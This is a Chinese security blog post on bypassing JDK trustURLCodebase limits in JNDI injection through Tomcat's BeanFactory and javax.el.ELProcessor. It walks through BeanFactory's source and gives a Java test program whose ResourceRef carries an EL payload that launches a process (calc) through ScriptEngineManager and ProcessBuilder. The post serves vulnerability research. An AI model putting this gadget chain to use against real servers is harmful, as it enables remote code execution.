@@ -1,0 +1,689 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    JNDI注入绕过高版本限制探究 |
+    
+    Aiyakami的博客
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="限制内容：    SQLJDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。JDK 6u211、7u201、8u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入绕过高版本限制探究">
+<meta property="og:url" content="http://example.com/2025/02/10/JNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Aiyakami的博客">
+<meta property="og:description" content="限制内容：    SQLJDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。JDK 6u211、7u201、8u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aiyakami.github.io/about/9/wps1-20250210152830-6oorc8t.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/9/wps2-20250210152830-kdm47qr.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/9/wps3-20250210152830-h5gfmyw.jpg">
+<meta property="og:image" content="https://aiyakami.github.io/about/9/wps6-20250210152830-lszttv9.jpg">
+<meta property="article:published_time" content="2025-02-10T07:49:51.148Z">
+<meta property="article:modified_time" content="2025-02-10T07:50:26.824Z">
+<meta property="article:author" content="aiyakami">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aiyakami.github.io/about/9/wps1-20250210152830-6oorc8t.jpg">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Aiyakami的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">首页</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">归档</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">关于</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/friend">友链</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="JNDI注入绕过高版本限制探究">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">JNDI注入绕过高版本限制探究</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-JNDI注入高版本绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/02/10/JNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-02-10T07:49:51.148Z" itemprop="datePublished">2025-02-10</time>
+    <time style="display: none;" id="post-update-time">2025-02-10</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p><strong>限制内容：</strong></p>
+<table>
+<thead>
+<tr>
+<th>SQL<br />JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。<br /><br />JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</th>
+</tr>
+</thead>
+</table>
+<p><strong>什么是远程codebase？</strong></p>
+<p>“远程 codebase”指的是通过网络从远程服务器加载 Java 类文件或其他资源的一种机制。它通常涉及使用 java.rmi、LDAP、HTTP 等协议，将类文件或代码从远程位置下载并在本地执行。</p>
+<p><strong>JNDI工作原理</strong></p>
+<p>jndi服务端 是传递一个Reference对象 然后客户端根据它获取远程类工厂factory，这个类工厂负责加载远程代码</p>
+<p>在限制条件下ObjectFactory 不能加载远程代码了，但其还有一个机制是先双亲委派从本地加载类，如果本地加载不到，从codebase加载</p>
+<p>也就是说如果服务端返回的Reference 对象指向的工厂类在本地存在，就会加载本地类工厂，执行该类的getObjectInstance</p>
+<p><strong>远程类工厂和远程类是什么关系？</strong></p>
+<p><strong>远程类工厂</strong>：是一个用于创建远程类实例的工厂，它将创建远程对象的细节封装起来，客户端通过它来创建远程对象的实例。</p>
+<p><strong>远程类</strong>：是实际实现远程操作的类，客户端通过创建远程类的实例并调用其方法来执行远程服务。</p>
+<table>
+<thead>
+<tr>
+<th>假设有一个远程计算服务，服务端实现了一个计算器类RemoteCalculator（远程类），它提供了加法、减法等远程方法。为了让客户端能够使用这个服务，服务端可能会通过 JNDI 将一个远程类工厂 CalculatorFactory（远程类工厂）注册到 JNDI 中。客户端查询到 CalculatorFactory 后，使用它创建一个 RemoteCalculator 对象，并通过这个对象来执行远程计算。</th>
+</tr>
+</thead>
+</table>
+<p><strong>可利用的工厂类beanFactory</strong></p>
+<p>在绑定JNDI时，可以指定工厂类，beanFactory可以实例化类，该类的无参构造方法会被调用，同时还会根据stringaddr的内容调用指定方法</p>
+<p>ResourceRefref&#x3D;new ResourceRef(“恶意类”, null, “”, “”, true, “org.apache.naming.factory.BeanFactory（指定工厂类）”, null);</p>
+<p>分析下面代码可知，valueArray作为方法参数，大小只有1，并且来着于value，同时被强转为string类型，所以被利用方法必须是一个参数为1个string的方法</p>
+<p>​<img src="https://aiyakami.github.io/about/9/wps1-20250210152830-6oorc8t.jpg">​</p>
+<p><strong>beanFactory实例化类时的要求：</strong></p>
+<p>工厂类来完成对恶意类的加载</p>
+<p>通过 ResourceRef，JNDI 系统会使用 BeanFactory 来实例化 ELProcessor 对象。BeanFactory 负责管理 ELProcessor 的生命周期，并在需要时提供实例。</p>
+<p>具体会调用 BeanFactory 的 getObjectInstance 方法来完成实例化。</p>
+<p><strong>BeanFactory 的 getObjectInstance 方法分析</strong></p>
+<p>首先是加载ref类的部分</p>
+<table>
+<thead>
+<tr>
+<th>SQL<br />public Object getObjectInstance(Object obj, Name name, Context nameCtx,<br /> Hashtable<?,?> environment)<br /> throws NamingException {<br /><br /> &#x2F;&#x2F; 检查传入的对象是否是 ResourceRef 实例<br /> if (obj instanceof ResourceRef) {<br /><br /> try {<br /><br /> &#x2F;&#x2F; 将 obj 强制转换为 Reference 类型<br /> Reference ref &#x3D; (Reference) obj;<br /><br /> &#x2F;&#x2F; 获取 Bean 类名（类名是存储在 ResourceRef 中的）<br /> String beanClassName &#x3D; ref.getClassName();<br /><br /> &#x2F;&#x2F; 初始化 beanClass 变量，用来保存类的 Class 对象<br /> Class&lt;?&gt; beanClass &#x3D; null;<br /><br /> &#x2F;&#x2F; 获取当前线程的上下文类加载器<br /> ClassLoader tcl &#x3D; Thread.currentThread().getContextClassLoader();<br /><br /> &#x2F;&#x2F; 如果上下文类加载器不为空，则尝试用它加载类<br /> if (tcl !&#x3D; null) {<br /> try {<br /> beanClass &#x3D; tcl.loadClass(beanClassName);<br /> } catch(ClassNotFoundException e) {<br /> &#x2F;&#x2F; 如果类没有找到，可以忽略错误（稍后会使用备用方法）<br /> }<br /> } else {<br /> &#x2F;&#x2F; 如果上下文类加载器为空，则使用系统类加载器来加载类<br /> try {<br /> beanClass &#x3D; Class.forName(beanClassName);<br /> } catch(ClassNotFoundException e) {<br /> e.printStackTrace();<br /> }<br /> }<br /><br /> &#x2F;&#x2F; 如果 beanClass 为空，说明无法找到指定的类，抛出 NamingException 异常<br /> if (beanClass &#x3D;&#x3D; null) {<br /> throw new NamingException(“Class not found: “ + beanClassName);<br /> }<br /><br /> &#x2F;&#x2F; 获取 Bean 的信息（JavaBean 的属性和方法）<br /> BeanInfo bi &#x3D; Introspector.getBeanInfo(beanClass);<br /><br /> &#x2F;&#x2F; 获取 Bean 的所有属性描述器<br /> PropertyDescriptor[] pda &#x3D; bi.getPropertyDescriptors();<br /><br /> &#x2F;&#x2F; 使用无参构造函数创建 Bean 的实例<br /> Object bean &#x3D; beanClass.getConstructor().newInstance();<br />}}</th>
+</tr>
+</thead>
+</table>
+<p>加载Ref类中的封装的类的数据，主要是通过ResourceRef 中名为 “forceString” 的 RefAddr 对象</p>
+<table>
+<thead>
+<tr>
+<th>SQL<br /> &#x2F;&#x2F; 获取 ResourceRef 中名为 “forceString” 的 RefAddr 对象<br /> RefAddr ra &#x3D; ref.get(“forceString”);<br /><br /> &#x2F;&#x2F; 创建一个存储强制设置属性方法的 Map（key：属性名，value：方法）<br /> Map&lt;String, Method&gt; forced &#x3D; new HashMap&lt;&gt;();<br /><br /> &#x2F;&#x2F; 如果 “forceString” 属性存在，处理该属性<br /> String value;<br /> if (ra !&#x3D; null) {<br /> &#x2F;&#x2F; 获取 “forceString” 的内容，值是以逗号分隔的属性列表<br /> value &#x3D; (String)ra.getContent();<br /> Class&lt;?&gt; paramTypes[] &#x3D; new Class[1];<br /> paramTypes[0] &#x3D; String.class;<br /> String setterName;<br /> int index;<br /><br /> &#x2F;&#x2F; 将每个属性和方法名解析并存入 forced Map<br /> for (String param: value.split(“,”)) {<br /> param &#x3D; param.trim();<br /><br /> &#x2F;&#x2F; 如果属性名中包含 ‘&#x3D;’，则提取方法名，否则使用默认的标准 setter 名称<br /> index &#x3D; param.indexOf(‘&#x3D;’);<br /> if (index &gt;&#x3D; 0) {<br /> setterName &#x3D; param.substring(index + 1).trim();<br /> param &#x3D; param.substring(0, index).trim();<br /> } else {<br /> setterName &#x3D; “set” + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);<br /> }<br /><br /> &#x2F;&#x2F; 尝试获取对应的 setter 方法，如果找不到则抛出异常<br /> try {<br /> forced.put(param, beanClass.getMethod(setterName, paramTypes));<br /> } catch (NoSuchMethodException|SecurityException ex) {<br /> throw new NamingException(“Forced String setter “ + setterName + “ not found for property “ + param);<br /> }<br /> }<br /> }<br /><br /> &#x2F;&#x2F; 获取 ResourceRef 中的所有 RefAddr 元素（每个 RefAddr 代表一个属性）<br /> Enumeration<RefAddr> e &#x3D; ref.getAll();<br /><br /> &#x2F;&#x2F; 遍历所有 RefAddr 元素，并为每个属性设置值<br /> while (e.hasMoreElements()) {<br /><br /> &#x2F;&#x2F; 获取当前的 RefAddr 对象<br /> ra &#x3D; e.nextElement();<br /><br /> &#x2F;&#x2F; 获取属性的名称（即 RefAddr 的类型）<br /> String propName &#x3D; ra.getType();<br /><br /> &#x2F;&#x2F; 忽略某些特定的属性，如 “factory”、”scope”、”auth” 等<br /> if (propName.equals(Constants.FACTORY) ||<br /> propName.equals(“scope”) || propName.equals(“auth”) ||<br /> propName.equals(“forceString”) ||<br /> propName.equals(“singleton”)) {<br /> continue;<br /> }<br /><br /> &#x2F;&#x2F; 获取属性的值（即 RefAddr 的内容）<br /> value &#x3D; (String)ra.getContent();<br /><br /> &#x2F;&#x2F; 创建一个数组来存放属性值（因为 setter 方法要求传递参数数组）<br /> Object[] valueArray &#x3D; new Object[1];<br /><br /> &#x2F;&#x2F; 如果该属性有强制设置的 setter 方法，则通过反射调用该方法<br /> Method method &#x3D; forced.get(propName);<br /> if (method !&#x3D; null) {<br /> valueArray[0] &#x3D; value;<br /> try {<br /> method.invoke(bean, valueArray);<br /> } catch (IllegalAccessException|<br /> IllegalArgumentException|<br /> InvocationTargetException ex) {<br /> throw new NamingException(“Forced String setter “ + method.getName() + “ threw exception for property “ + propName);<br /> }<br /> continue;<br /> }<br /><br /> &#x2F;&#x2F; 如果没有强制设置的 setter，则根据属性名构造标准的 setter 方法名，并调用它<br /> setterName &#x3D; “set” + propName.substring(0, 1).toUpperCase(Locale.ENGLISH) + propName.substring(1);<br /> try {<br /> Method method &#x3D; beanClass.getMethod(setterName, String.class);<br /> valueArray[0] &#x3D; value;<br /> method.invoke(bean, valueArray);<br /> } catch (NoSuchMethodException ex) {<br /> &#x2F;&#x2F; 如果没有找到 setter 方法，则忽略该属性<br /> }<br /> }<br /><br /> &#x2F;&#x2F; 返回创建的 bean 实例<br /> return bean;<br /><br /> } catch (Exception ex) {<br /> throw new NamingException(“Error creating bean instance: “ + ex.getMessage());<br /> }<br /> }<br /><br /> &#x2F;&#x2F; 如果 obj 不是 ResourceRef 实例，抛出 NamingException<br /> throw new NamingException(“Invalid object type: “ + obj.getClass().getName());<br /> }<br /></th>
+</tr>
+</thead>
+</table>
+<p><strong>被利用类需要满足的要求</strong></p>
+<p>根据上述的加载过程，得出内层利用需要满足条件：</p>
+<p>类需要有无参构造函数，被利用方法需满足参数个数为1，参数类型为String</p>
+<p>满足上述要求的类的一种是:javax.el.ELProcessor#eval</p>
+<p>原因可以从BeanFactory 的 getObjectInstance 方法得出，首先是类需要有无参构造函数，这点从实例化类时的方法可以得出，如果类无构造方法，getConstructor时便会报错</p>
+<table>
+<thead>
+<tr>
+<th>SQL<br />Object bean &#x3D; beanClass.getConstructor().newInstance();</th>
+</tr>
+</thead>
+</table>
+<p>被利用方法需满足参数个数为1，参数类型为String</p>
+<table>
+<thead>
+<tr>
+<th>SQL<br />value &#x3D; (String)ra.getContent();<br /><br />Object[] valueArray &#x3D; new Object[1];<br /><br /> <em>&#x2F;</em>  Shortcut for properties with explicitly configured setter  <em>&#x2F;</em> <br />Method method &#x3D; forced.get(propName);<br />if (method !&#x3D; null) {<br /> valueArray[0] &#x3D; value;<br /> try {<br /> method.invoke(bean, valueArray);<br /> }…………..</th>
+</tr>
+</thead>
+</table>
+<p><strong>调试流程追踪</strong></p>
+<p>测试代码</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>SQL<br />package org.example;<br />import org.apache.naming.ResourceRef;<br />import org.apache.naming.factory.BeanFactory;<br />import javax.naming.StringRefAddr;<br />import java.lang.reflect.Method;<br />import javax.el.ELProcessor;<br />public class Main {<br /> public static void main(String[] args) {<br /> try {<br />  <em>&#x2F;&#x2F; 加载 BeanFactory 类</em><br /> Class&lt;?&gt; BeanFactoryClass &#x3D; Class.<em>forName</em>(“org.apache.naming.factory.BeanFactory”);<br /> Method method&#x3D; BeanFactoryClass.getDeclaredMethod(“getObjectInstance”, java.lang.Object.class, javax.naming.Name.class, javax.naming.Context.class, java.util.Hashtable.class);<br />  <em>&#x2F;&#x2F;在反射中也需要new一下原类，反射调用的是方法，类仍需要原本的实例化</em><br /> BeanFactory beanFactory&#x3D;new BeanFactory();<br />  <em>&#x2F;&#x2F;准备参数</em><br /> java.lang.Object Object&#x3D; null;<br /> javax.naming.Name name &#x3D; null;<br /> javax.naming.Context context &#x3D; null;<br /> java.util.Hashtable&lt;String, String&gt; environment &#x3D; null;<br /> ResourceRef ref&#x3D;new ResourceRef(“javax.el.ELProcessor”, null, “”, “”, true, “org.apache.naming.factory.BeanFactory”, null);<br /> ref.add(new StringRefAddr(“forceString”, “x&#x3D;eval”));<br /> ref.add(new StringRefAddr(“x”, “&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance()” +<br /> “.getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[‘(java.lang.String[])’]” +<br /> “([‘calc’]).start()&quot;)”));<br /> Object result &#x3D; method.invoke(beanFactory, ref, name, context, environment);<br /> }catch (Exception e){<br />  <em>&#x2F;&#x2F; 获取构造方法内部抛出的实际异常</em><br /> Throwable cause &#x3D; e.getCause();  <em>&#x2F;&#x2F; 获取根本原因</em><br /> cause.printStackTrace();  <em>&#x2F;&#x2F; 打印堆栈跟踪信息</em><br /> }<br /> }<br />}</th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+</table>
+<p>beanloadclass获取的就是利用类</p>
+<p>​<img src="https://aiyakami.github.io/about/9/wps2-20250210152830-kdm47qr.jpg">​</p>
+<p>首先获得forceString x，然后Method method &#x3D; forced.get(propName);得到eval方法</p>
+<p>​<img src="https://aiyakami.github.io/about/9/wps3-20250210152830-h5gfmyw.jpg">​</p>
+<p><strong>踩坑</strong></p>
+<p>​<img src="https://aiyakami.github.io/about/9/wps6-20250210152830-lszttv9.jpg">​</p>
+<p>这两个包是不同的东西，如果是下面这个包，ELProcess就会没有无参构造方法然后导致利用失败</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://aiyakami.github.io/covers/1.jpg" data-sizes="auto" alt="JDBC反序列化漏洞探究" class="lazyload">
+        
+      
+      <a href="/2025/02/08/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          JDBC反序列化漏洞探究
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">12</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      aiyakami
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        15.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:03
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">12</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
